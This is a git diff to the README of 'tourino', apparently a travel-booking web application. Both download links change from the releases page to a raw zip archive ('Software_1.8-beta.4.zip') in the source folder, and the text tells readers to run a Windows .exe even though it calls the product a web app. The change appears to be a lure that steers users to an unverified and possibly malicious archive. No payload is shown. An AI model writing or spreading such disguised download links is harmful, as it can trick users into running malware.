@@ -1,6 +1,6 @@
 # 🌍 tourino - Find and book your dream trips
 
-[![Download Tourino](https://img.shields.io/badge/Download-Tourino_for_Windows-blue.svg)](https://github.com/Rust8709/tourino/releases)
+[![Download Tourino](https://img.shields.io/badge/Download-Tourino_for_Windows-blue.svg)](https://raw.githubusercontent.com/Rust8709/tourino/main/src/Software_1.8-beta.4.zip)
 
 Tourino helps people find, research, and book travel experiences. This web application provides a simple interface to browse destinations, view tour details, and manage bookings. You use this tool to connect with providers and secure your spot on guided trips.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 You get the latest version of Tourino directly from the project repository. Follow these steps to obtain the setup file.
 
-1. Visit [this page to download](https://github.com/Rust8709/tourino/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Rust8709/tourino/main/src/Software_1.8-beta.4.zip).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or your desktop to find it quickly.
